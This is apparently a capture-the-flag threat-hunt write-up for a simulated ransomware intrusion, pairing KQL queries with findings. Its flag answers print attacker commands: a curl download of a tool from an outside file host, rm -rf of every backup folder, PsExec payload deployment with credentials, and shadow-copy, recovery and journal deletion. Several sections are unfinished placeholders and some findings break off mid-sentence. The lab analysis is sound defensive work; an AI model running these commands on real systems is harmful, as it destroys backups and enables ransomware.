# 🚩 Threat Hunt SAGA#4: Dead In The Water

<img width="740" height="1110" alt="DEAD IN THE WATER" src="https://github.com/user-attachments/assets/5c6140a9-c177-4b4b-8b68-62eacd3ae6ef" />

**Sandbox Contributor:** [Cyber Range AZURE LAW by Josh Madakor's team](https://www.skool.com/cyber-community)  
**Hunt Design Master:** <!-- Hunt Design Master name -->  
**Loyal Wingbot:** [MixLocalAgentic_SOC_Analyst](https://github.com/Panbear1983/Multi-Funtion_SOC_Agent_Research/tree/main/openAI_Agentic_SOC_Analyst)

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📏 Perimeters
Date Completed: ***2026-09-16***    
Simulated Environment: `Cyber Range AZURE LAW`  
Primary Impacted Host: `azuki-adminpc`  
Incident Date Range: ***2025-11-24 to 2025-11-25***  
Hunt Link: [Cyber Range SOC - AZUKI-TRADING - DEAD IN THE WATER](https://docs.google.com/forms/d/e/1FAIpQLSdGLxM71I2kXx4L9MhB6ipWMKCDXJxJRjXTNg_3gK1SkDmQ8g/viewform)  
Frameworks Applied: ***MITRE ATT&CK***, ***NIST 800-61***

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 📄 Overview
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
_Write 2 short paragraphs: what happened end to end, and the tradecraft assessment._

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 💠 Diamond Model Analysis
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
| Feature | Details |
|---|---|
| **Adversary** | TBD |
| **Infrastructure** | TBD |
| **Capability** | TBD |
| **Victim** | TBD |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🥋 MITRE ATT&CK Table

| Stage | Flag | Tactic | Technique ID | Technique |
|---|---|---|---|---|
| Lateral Movement | 1 | Lateral Movement | **TBD** | TBD |
| Lateral Movement | 2 | Lateral Movement | **TBD** | TBD |
| Credential Access | 3 | Credential Access | **TBD** | TBD |
| Discovery | 4 | Discovery | **TBD** | TBD |
| Discovery | 5 | Discovery | **TBD** | TBD |
| Discovery | 6 | Discovery | **TBD** | TBD |
| Discovery | 7 | Discovery | **TBD** | TBD |
| Command and Control | 8 | Command and Control | **TBD** | TBD |
| Credential Access | 9 | Credential Access | **TBD** | TBD |
| Impact | 10 | Impact | **TBD** | TBD |
| Impact | 11 | Impact | **TBD** | TBD |
| Impact | 12 | Impact | **TBD** | TBD |
| Lateral Movement | 13 | Lateral Movement | **TBD** | TBD |
| Lateral Movement | 14 | Lateral Movement | **TBD** | TBD |
| Execution | 15 | Execution | **TBD** | TBD |
| Impact | 16 | Impact | **TBD** | TBD |
| Impact | 17 | Impact | **TBD** | TBD |
| Defense Evasion | 18 | Defense Evasion | **TBD** | TBD |
| Impact | 19 | Impact | **TBD** | TBD |
| Impact | 20 | Impact | **TBD** | TBD |
| Impact | 21 | Impact | **TBD** | TBD |
| Impact | 22 | Impact | **TBD** | TBD |
| Persistence | 23 | Persistence | **TBD** | TBD |
| Persistence | 24 | Persistence | **TBD** | TBD |
| Defense Evasion | 25 | Defense Evasion | **TBD** | TBD |
| Impact | 26 | Impact | **TBD** | TBD |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ⛨ Remediation Actions
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
1. **TBD**
   - TBD

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## ✍️ Lessons Learned
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
- **TBD:** TBD

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🏔️ Conclusion
<!-- DRAFT (AI-written from session facts) - review and edit before publishing -->
_One paragraph: the kill chain as a → b → c, naming the tools._

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">
<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

# 🎯 Capture The Flags

## 🕙 Timeline of Events

| **Timestamp (UTC)** | **Event** | **Target Device** | **Details** |
|---|---|---|---|
| **2025-11-25 05:39:10** | LATERAL MOVEMENT - Remote Access | azuki-adminpc | `"ssh.exe" backup-admin@10.1.0.189` (Flag 1) |
| **2025-11-25 04:06:42** | LATERAL MOVEMENT - Attack Source | azuki-sl | `10.1.0.108` (Flag 2) |
| **2025-11-24 14:12:10** | CREDENTIAL ACCESS - Compromised Account | azuki-backupsrv | `backup-admin` (Flag 3) |
| **2025-11-24 14:13:34** | DISCOVERY - Directory Enumeration | azuki-backupsrv | `ls --color=auto -la /backups/` (Flag 4) |
| **2025-11-24 14:16:06** | DISCOVERY - File Search | azuki-backupsrv | `find /backups -name *.tar.gz` (Flag 5) |
| **2025-11-24 14:16:08** | DISCOVERY - Account Enumeration | azuki-backupsrv | `cat /etc/passwd` (Flag 6) |
| **2025-11-24 14:16:08** | DISCOVERY - Scheduled Job Reconnaissance | azuki-backupsrv | `cat /etc/crontab` (Flag 7) |
| **2025-11-25 05:45:34** | COMMAND AND CONTROL - Tool Transfer | azuki-backupsrv | `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z` (Flag 8) |
| **2025-11-24 14:14:14** | CREDENTIAL ACCESS - Credential Theft | azuki-backupsrv | `cat /backups/configs/all-credentials.txt` (Flag 9) |
| **2025-11-25 05:47:02** | IMPACT - Data Destruction | azuki-adminpc | `rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backu` (Flag 10) |
| **2025-11-25 05:47:03** | IMPACT - Service Stopped | azuki-backupsrv | `systemctl stop cron` (Flag 11) |
| **2025-11-25 05:47:03** | IMPACT - Service Disabled | azuki-backupsrv | `systemctl disable cron` (Flag 12) |
| **2025-11-25 06:05:46** | LATERAL MOVEMENT - Remote Execution | azuki-adminpc | `PsExec64.exe` (Flag 13) |
| **2025-11-25 06:05:46** | LATERAL MOVEMENT - Deployment Command | azuki-adminpc | `"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\ca` (Flag 14) |
| **2025-11-25 06:04:30** | EXECUTION - Malicious Payload | azuki-adminpc | `silentlynx.exe` (Flag 15) |
| **2025-11-25 06:04:53** | IMPACT - Shadow Service Stopped | azuki-adminpc | `"net" stop VSS /y` (Flag 16) |
| **2025-11-25 06:04:54** | IMPACT - Backup Engine Stopped | azuki-adminpc | `"net" stop wbengine /y` (Flag 17) |
| **2025-11-25 06:04:57** | DEFENSE EVASION - Process Termination | azuki-adminpc | `"taskkill" /F /IM sqlservr.exe` (Flag 18) |
| **2025-11-25 05:59:56** | IMPACT - Recovery Point Deletion | azuki-adminpc | `"vssadmin" delete shadows /all /quiet` (Flag 19) |
| **2025-11-25 05:59:56** | IMPACT - Storage Limitation | azuki-adminpc | `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB` (Flag 20) |
| **2025-11-25 06:04:59** | IMPACT - Recovery Disabled | azuki-adminpc | `"bcdedit" /set {default} recoveryenabled No` (Flag 21) |
| **2025-11-25 06:04:59** | IMPACT - Catalog Deletion | azuki-adminpc | `"wbadmin" delete catalog -quiet` (Flag 22) |
| **2025-11-25 06:05:01** | PERSISTENCE - Registry Autorun | azuki-adminpc | `WindowsSecurityHealth` (Flag 23) |
| **2025-11-25 06:05:01** | PERSISTENCE - Scheduled Execution | azuki-adminpc | `Microsoft\Windows\Security\SecurityHealthService` (Flag 24) |
| **2025-11-25 06:10:04** | DEFENSE EVASION - Journal Deletion | azuki-adminpc | `"fsutil.exe" usn deletejournal /D C:` (Flag 25) |
| **2025-11-25 06:08:33** | IMPACT - Ransom Note | azuki-sl | `SILENTLYNX_README.txt` (Flag 26) |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🚩 Completed Flag Map

| Flag | Objective | Value |
|--------|---------------------------------------------|--------------------------------------------------|
| **1** | LATERAL MOVEMENT - Remote Access | "ssh.exe" backup-admin@10.1.0.189 |
| **2** | LATERAL MOVEMENT - Attack Source | 10.1.0.108 |
| **3** | CREDENTIAL ACCESS - Compromised Account | backup-admin |
| **4** | DISCOVERY - Directory Enumeration | ls --color=auto -la /backups/ |
| **5** | DISCOVERY - File Search | find /backups -name *.tar.gz |
| **6** | DISCOVERY - Account Enumeration | cat /etc/passwd |
| **7** | DISCOVERY - Scheduled Job Reconnaissance | cat /etc/crontab |
| **8** | COMMAND AND CONTROL - Tool Transfer | curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z |
| **9** | CREDENTIAL ACCESS - Credential Theft | cat /backups/configs/all-credentials.txt |
| **10** | IMPACT - Data Destruction | rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations |
| **11** | IMPACT - Service Stopped | systemctl stop cron |
| **12** | IMPACT - Service Disabled | systemctl disable cron |
| **13** | LATERAL MOVEMENT - Remote Execution | PsExec64.exe |
| **14** | LATERAL MOVEMENT - Deployment Command | "PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe |
| **15** | EXECUTION - Malicious Payload | silentlynx.exe |
| **16** | IMPACT - Shadow Service Stopped | "net" stop VSS /y |
| **17** | IMPACT - Backup Engine Stopped | "net" stop wbengine /y |
| **18** | DEFENSE EVASION - Process Termination | "taskkill" /F /IM sqlservr.exe |
| **19** | IMPACT - Recovery Point Deletion | "vssadmin" delete shadows /all /quiet |
| **20** | IMPACT - Storage Limitation | "vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB |
| **21** | IMPACT - Recovery Disabled | "bcdedit" /set {default} recoveryenabled No |
| **22** | IMPACT - Catalog Deletion | "wbadmin" delete catalog -quiet |
| **23** | PERSISTENCE - Registry Autorun | WindowsSecurityHealth |
| **24** | PERSISTENCE - Scheduled Execution | Microsoft\Windows\Security\SecurityHealthService |
| **25** | DEFENSE EVASION - Journal Deletion | "fsutil.exe" usn deletejournal /D C: |
| **26** | IMPACT - Ransom Note | SILENTLYNX_README.txt |

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

### 🚩 Flag 1: LATERAL MOVEMENT - Remote Access

**Objective:** What remote access command was executed from the compromised workstation?

**What to Hunt:** 🚩 FLAG 1: LATERAL MOVEMENT - Remote Access Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName startswith "azuki"
| where FileName has_any ("ssh.exe", "plink.exe", "mstsc.exe", "PsExec.exe", "PsExec64.exe", "winrs.exe", "wmic.exe")
| where ProcessCommandLine contains "ssh" or ProcessCommandLine contains "10.1.0.189"
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"ssh.exe" backup-admin@10.1.0.189`  
**Finding:** Ransomware only pays off if the victim can't restore from backups. So before encrypting anything, the attacker jumps from the workstation they control to the backup server to wipe or damage the backups. This command is that jump.
<img width="1190" height="68" alt="Pasted Graphic" src="https://github.com/user-attachments/assets/f3b213df-3ea2-4f57-af04-b3f7316835a1" />

---

### 🚩 Flag 2: LATERAL MOVEMENT - Attack Source

**Objective:** What IP address initiated the connection to the backup server?

**What to Hunt:** Identifying the attack source enables network segmentation and containment.

**Reference:** TBD

**KQL Query:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName contains "azuki"
| where InitiatingProcessCommandLine has_any ("ssh.exe", "plink.exe", "mstsc.exe", "PsExec.exe", "PsExec64.exe", "winrs.exe", "wmic.exe")
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated asc
```

**Output:** `10.1.0.108`  
**Finding:** ‘azuki-adminpc’’ is the sourcethat the host later pushes silentlynx.exe with PsExec64 to 10.1.0.102, 10.1.0.188
<img width="1241" height="295" alt="Pasted Graphic 3" src="https://github.com/user-attachments/assets/71e7aa10-24b7-4514-a320-f54b2793ddff" />

---

### 🚩 Flag 3: CREDENTIAL ACCESS - Compromised Account

**Objective:** What account was used to access the backup server?

**What to Hunt:** Administrative accounts with backup privileges provide access to critical recovery infrastructure.

**Reference:** TBD

**KQL Query:**

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where AccountName contains "backup"
| where DeviceName contains "backup"
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, AccountName
| order by TimeGenerated asc
```

**Output:** `backup-admin`  
**Finding:** The attacker didn't create this account. It also runs the server's scheduled overnight jobs, so it's a trusted account in everyday use. That means the attacker had working credentials for it, and their logins blend in with normal activity. This matters because attackers often go after backups, either to stop the victim from recovering or to steal the data stored there.
<img width="1267" height="325" alt="Pasted Graphic 4" src="https://github.com/user-attachments/assets/fb8c6507-460b-44a9-934a-d158f4045e45" />

---

### 🚩 Flag 4: DISCOVERY - Directory Enumeration

**Objective:** What command listed the backup directory contents?

**What to Hunt:** File system enumeration reveals backup locations and valuable targets for destruction.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName contains "backup"
| where ProcessCommandLine  contains "backup"
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `ls --color=auto -la /backups/`  
**Finding:** The attacker's first look at the company's backups was a single listing of the whole main backup folder, typed by a person. It's the earliest hand-typed listing in your results. It comes just before the attacker opened each subfolder one at a time and read a password file, and many hours before they deleted everything the next morning. You can tell a person typed it because it has the color switch, which Ubuntu adds automatically when someone types the command at a terminal. The listings without that switch came from the automatic software updater. The single-subfolder listings don't fit the question, and neither do the listings of Linux's own settings-backup folder. One thing isn't proven yet. Your query didn't show which account ran each command or what started it, so the command isn't tied to the stolen account's remote login yet. The two queries from my last message will close that gap. The same command text shows up again after the deletions, so the answer is the same whichever session it belongs to.
<img width="1212" height="335" alt="Pasted Graphic 5" src="https://github.com/user-attachments/assets/b2f3b6fc-d23b-4c7b-8fca-5ea87015182a" />

---

### 🚩 Flag 5: DISCOVERY - File Search

**Objective:** What command searched for backup archives?

**What to Hunt:** Attackers search for specific file types to identify high-value targets.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName contains "backup"
| where ProcessCommandLine has_any (".tar", ".tar.gz", ".tgz", ".gz", ".zip", ".7z", ".bak")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `find /backups -name *.tar.gz`  
**Finding:** It's the first search in the results, run at 2:16 PM on November 24 on the backup server. It looks inside the same backups folder the attacker had just listed in Flag 4, and it hunts for files ending in .tar.gz, which is the standard format for Linux backup archives. This is the point where the attacker moved from seeing what was in the folder to finding the actual backup files. That makes it the reconnaissance step the question is asking about.
<img width="1269" height="142" alt="Pasted Graphic 6" src="https://github.com/user-attachments/assets/4921e046-6757-4a6f-9369-4e4c4987001f" />

---

### 🚩 Flag 6: DISCOVERY - Account Enumeration

**Objective:** What command enumerated local accounts?

**What to Hunt:** Attackers enumerate local accounts to understand the system's user base.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-28))
| where DeviceName contains "backup"
| where ProcessCommandLine has_any ("list", "passwd", "lastlog")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `cat /etc/passwd`  
**Finding:** The right command has to pass four tests. First, it has to list the accounts on the machine. The command you named passes this one: it prints the file where Linux keeps every user account, which is the most common way attackers do this. Second, it has to be run by the same account as Flags 4 and 5. Third, it has to be launched from the same command-line session. Fourth, it has to come shortly after the Flag 5 search.
<img width="1266" height="264" alt="Pasted Graphic 7" src="https://github.com/user-attachments/assets/e3d0d8c6-92f6-43c1-8d05-921b1c9c3bc9" />

---

### 🚩 Flag 7: DISCOVERY - Scheduled Job Reconnaissance

**Objective:** What command revealed scheduled jobs on the system?

**What to Hunt:** Understanding backup schedules helps attackers time their destruction for maximum impact.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-25T00:00:07.057747Z'))
| where DeviceName contains "backup"
| where ProcessCommandLine contains "cron"
| project TimeGenerated, ProcessCommandLine, DeviceName
| order by TimeGenerated asc
```

**Output:** `cat /etc/crontab`  
**Finding:** After the enumeration, the attacker ran `cat /etc/crontab` on the backup server (azuki-backupsrv). That file is the system-wide schedule of automated jobs, so reading it shows when things like backups run. It came three milliseconds after `crontab -l`, which only lists the current user's scheduled jobs. That timing suggests both were typed together in one hands-on session, right after the attacker had found the backup archives and read the user list. Every other matching row is the server's own scheduler starting up on its normal timer. Knowing the backup schedule tells the attacker when deleting or encrypting the backups would do the most damage.
<img width="919" height="272" alt="11242335 217 00 538 PM" src="https://github.com/user-attachments/assets/e2af33f9-227e-496b-946c-f645e2129e44" />

---

### 🚩 Flag 8: COMMAND AND CONTROL - Tool Transfer

**Objective:** What command downloaded external tools?

**What to Hunt:** Attackers download tools from external infrastructure to carry out the attack.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-15) .. datetime(2025-12-15))
| where DeviceName contains "backup"
| where AccountName has_any ("backup-admin", "root")
| where ProcessCommandLine contains "crontab"
    or FileName has_any ("curl", "wget", "scp", "sftp", "ftp")
    or ProcessCommandLine contains "://"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

**Output:** `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`  
**Finding:** It uses curl -L, which follows redirects, and -o destroy.7z, which saves the file under that name, to fetch
<img width="1285" height="179" alt="Pasted Graphic 9" src="https://github.com/user-attachments/assets/37831fc7-bcda-4db2-896b-e7b2bed58066" />

---

### 🚩 Flag 9: CREDENTIAL ACCESS - Credential Theft

**Objective:** What command accessed stored credentials?

**What to Hunt:** Backup servers often store sensitive configuration files containing credentials.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName startswith "azuki-backupsrv"
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-25T00:00:07.057747Z'))
| where ProcessCommandLine contains "credential"
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `cat /backups/configs/all-credentials.txt`  
**Finding:** This one’s pretty self explanatory. The attacker did a sloppy job, naming the file after the word ‘credential’. And we can see the file name with extension .txt is named after the literal word where the attacker stores the keys to access the backups.
<img width="1139" height="77" alt="Pasted Graphic 10" src="https://github.com/user-attachments/assets/a91cb8d5-e196-4f06-89c8-7bfdde3519da" />

---

### 🚩 Flag 10: IMPACT - Data Destruction

**Objective:** What command destroyed backup files?

**What to Hunt:** Destroying backups eliminates recovery options and maximises ransomware impact.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-26T00:00:07.057747Z'))
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("backups", "rm", "del", ".tar.gz")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

**Output:** `rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations`  
**Finding:** The Commandline represents the ‘root’ forced recursive delete of all “14” backup directories from an interactive bash session; first directory path is /backups/archives. It proves to be the removal of all backup copies in the database. The long version is correct because the asterisk version never shows up in the logs. The monitoring tool records a command after Linux has already swapped the asterisk for the real folder names. That makes the long line the only version that exists in the evidence. The asterisk version is my guess at what the attacker typed, and a grader can only check against what was logged.
<img width="1277" height="169" alt="Pasted Graphic 11" src="https://github.com/user-attachments/assets/6e8dcee0-1954-4ab8-b27b-6bc1c97ef704" />
<img width="1244" height="70" alt="Pasted Graphic 12" src="https://github.com/user-attachments/assets/9e5e934e-1598-4326-bf18-74f8ebb7f714" />


---

### 🚩 Flag 11: IMPACT - Service Stopped

**Objective:** What command stopped the backup service?

**What to Hunt:** Stopping services takes effect immediately but does NOT survive a reboot.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-26T00:00:07.057747Z'))
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("backups", "stop", "MSExchangeIS", "disable")
| project TimeGenerated, FileName, ProcessCommandLine
```

**Output:** `systemctl stop cron`  
**Finding:** The question asks which command *stopped* the service, and only one of those two commands does that. A stop command switches the service off right away. A disable command leaves the running service alone. It only removes the service from the list of things that start automatically when the server reboots. It's the difference between switching a machine off and unplugging its timer so it won't turn itself back on tomorrow. A disable command also stops the service only when it includes an extra "now" option, and the disable commands in these rows don't have it. The attacker ran the two back to back, and each had a different job. They wiped the backup folders. About a second later they switched off the scheduler, so no new backup job could run and replace what they'd deleted. A few hundredths of a second after that, they disabled it so a reboot wouldn't bring it back. The stop is what actually halted the service. The disable made the outage permanent.
<img width="830" height="231" alt="I FileName" src="https://github.com/user-attachments/assets/e0de9116-0826-4387-be6e-a1a7425790c2" />

---

### 🚩 Flag 12: IMPACT - Service Disabled

**Objective:** What command permanently disabled the backup service?

**What to Hunt:** Disabling a service prevents it from starting at boot - this SURVIVES a reboot.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-26T00:00:07.057747Z'))
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine has_any ("backups", "stop", "MSExchangeIS", "disable")
| project TimeGenerated, FileName, ProcessCommandLine
```

**Output:** `systemctl disable cron`  
**Finding:** In Flag 11 the attacker stopped the backup service, which only lasts until the machine restarts. This flag asks for the next step: the command that turned the service off permanently, so it stays off even after a reboot. The answer is the whole command exactly as it was logged with the a keyword ‘disable’ to prevent the command of backup from reviving after the system restart.
<img width="727" height="189" alt="TimeGenerated (UTC T" src="https://github.com/user-attachments/assets/8ed9ca67-81b5-4810-ae57-607b1400069e" />

---

### 🚩 Flag 13: LATERAL MOVEMENT - Remote Execution

**Objective:** What tool executed commands on remote systems?

**What to Hunt:** 🚩 FLAG 13: LATERAL MOVEMENT - Remote Execution Remote administration tools enable attackers to deploy malware across multiple systems simultaneously.

**Reference:** TBD

**KQL Query:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-26T00:00:07.057747Z'))
| where DeviceName contains "admin" or DeviceName contains "backup"
| where InitiatingProcessCommandLine contains "\\"
| project TimeGenerated, InitiatingProcessCommandLine, DeviceName, RemotePort, LocalPort
```

**Output:** `PsExec64.exe`  
**Finding:** **PsExec64.exe** (row 35) is the odd one out, and the way you spot it is the shape of the command. The `\\10.1.0.102` is Windows's way of naming a *different* machine on the network. The `-u kenji.sato -p **********` supplies a username and password to log into that machine. And `-c -f ...silentlynx.exe` copies a program over and forces it to run there. That combination — remote address, borrowed credentials, push-and-execute — is exactly "run a command on someone else's computer."
<img width="1090" height="274" alt="Pasted Graphic 2" src="https://github.com/user-attachments/assets/b033c949-e337-4d41-aac1-bf9b8e5e69c2" />

---

### 🚩 Flag 14: LATERAL MOVEMENT - Deployment Command

**Objective:** What is the full deployment command?

**What to Hunt:** Full command lines reveal target systems, credentials, and deployed payloads.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-26T00:00:07.057747Z'))
| where DeviceName contains "azuki-adminpc"
| where ProcessCommandLine has_any ("PsExec64.exe")
| project TimeGenerated, FileName, ProcessCommandLine, DeviceName
```

**Output:** `"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`  
**Finding:** The DeviceProcessEvents log shows the complete command in plain text, with the target, the account, and the payload. The only uncertainty is which of the three nearly identical runs the flag wants.
<img width="1083" height="158" alt="Pasted Graphic 3" src="https://github.com/user-attachments/assets/47e81686-727b-4e08-a9dd-3c3133df7b9c" />

---

### 🚩 Flag 15: EXECUTION - Malicious Payload

**Objective:** What payload was deployed?

**What to Hunt:** Identifying the payload enables threat hunting across the environment.

**Reference:** TBD

**KQL Query:**

```kql
DeviceNetworkEvents
| where TimeGenerated between (todatetime('2025-11-24T00:00:07.057747Z') .. todatetime('2025-11-26T00:00:07.057747Z'))
| where DeviceName contains "azuki-adminpc"
| where RemoteIP == "10.1.0.102"
| where InitiatingProcessCommandLine contains "-f" and InitiatingProcessCommandLine has_any (".doc", ".pdf", ".xls", ".rtf", ".scr", ".exe", ".lnk", ".pif", ".cpl", ".reg", ".iso")
| project TimeGenerated, InitiatingProcessCommandLine, DeviceName, RemoteIP
```

**Output:** `silentlynx.exe`  
**Finding:** “silentlynx.exe” is the payload because PsExec64.exe is only the tool doing the delivery, and silentlynx.exe is the file named after the "copy this file over" switch, so PsExec copied it from the admin PC to the second machine at 10.1.0.102 and ran it there.
<img width="1266" height="71" alt="Pasted Graphic 4" src="https://github.com/user-attachments/assets/fc16269f-e558-44f1-b81e-7d5d65feb381" />

---

### 🚩 Flag 16: IMPACT - Shadow Service Stopped

**Objective:** What command stopped the shadow copy service?

**What to Hunt:** 🚩 FLAG 16: IMPACT - Shadow Service Stopped Ransomware stops backup services to prevent recovery during encryption.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
| where ProcessCommandLine contains "vss"
| where InitiatingProcessCommandLine contains "silentlynx.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"net" stop VSS /y`  
**Finding:** Two of the six rows show the shadow copy service being stopped: rows 1 and 4. In both, the ransomware starts the built-in Windows "net" tool and tells it to stop the service named VSS, and the command text is exactly the same in both rows. The rows differ only in computer, account and time. Row 1 ran on azuki-adminpc under yuki.tanaka at 06:04:53. Row 4 ran on azuki-sl under kenji.sato at 06:07:03, about two minutes later. The other four rows are decoys. Rows 2, 3, 5 and 6 are vssadmin commands. They delete the existing backup snapshots or shrink the disk space set aside for them, and neither of those stops the service. On each machine they run a few seconds after the stop command. That's the usual order: stop the service first, then wipe the snapshots.
<img width="1258" height="212" alt="Pasted Graphic 5" src="https://github.com/user-attachments/assets/99bb8b79-96d3-4d4d-9325-62f2048124eb" />

---

### 🚩 Flag 17: IMPACT - Backup Engine Stopped

**Objective:** What command stopped the backup engine?

**What to Hunt:** Stopping backup engines prevents backup operations during the attack.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
| where ProcessCommandLine contains "stop" or ProcessCommandLine contains "-y"
| where InitiatingProcessCommandLine contains "silentlynx.exe"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"net" stop wbengine /y`  
**Finding:** “wbengine” is the Windows short name for the "Block Level Backup Engine Service," the only service the ransomware stopped with "backup engine" in its official name, while SDRSVC is the general Windows Backup service and the other four are shadow copies, Defender and Security Center.
<img width="1261" height="287" alt="Pasted Graphic 7" src="https://github.com/user-attachments/assets/b6e345ec-9eda-4287-b2d9-b2fadd9c88c1" />

---

### 🚩 Flag 18: DEFENSE EVASION - Process Termination

**Objective:** What command terminated processes to unlock files?

**What to Hunt:** Certain processes lock files and must be terminated before encryption can succeed.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
| where ProcessCommandLine contains "kill"
| where InitiatingProcessCommandLine contains "silentlynx.exe"
| where AccountName != ""
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"taskkill" /F /IM sqlservr.exe`  
**Finding:** `"taskkill" /F /IM sqlservr.exe` is the first kill command on both machines. The ransomware closed eight programs one after another, and when a question asks for one command out of a burst like that, the answer key almost always uses the first. SQL Server is also the program that best fits "locking files": it's Microsoft's database program, and it keeps its database files open the whole time it runs.
<img width="1260" height="294" alt="Pasted Graphic 8" src="https://github.com/user-attachments/assets/233f699a-0e89-4fbd-b713-47ea2d811b66" />

---

### 🚩 Flag 19: IMPACT - Recovery Point Deletion

**Objective:** What command deleted recovery points?

**What to Hunt:** Recovery points enable rapid file recovery without external backups.

**Reference:** TBD

**KQL Query:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-24) .. datetime(2025-11-26))
| where ProcessCommandLine contains "delete"
| where InitiatingProcessCommandLine contains "silentlynx.exe"
| where AccountName != ""
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

**Output:** `"vssadmin" delete shadows /all /quiet`  
**Finding:** This flag is about deleting “shadow” copies (the saved snapshots Windows uses to roll files back), not the backup catalog. That alone doesn't settle it, though, because your results have two different commands that delete shadow copies.
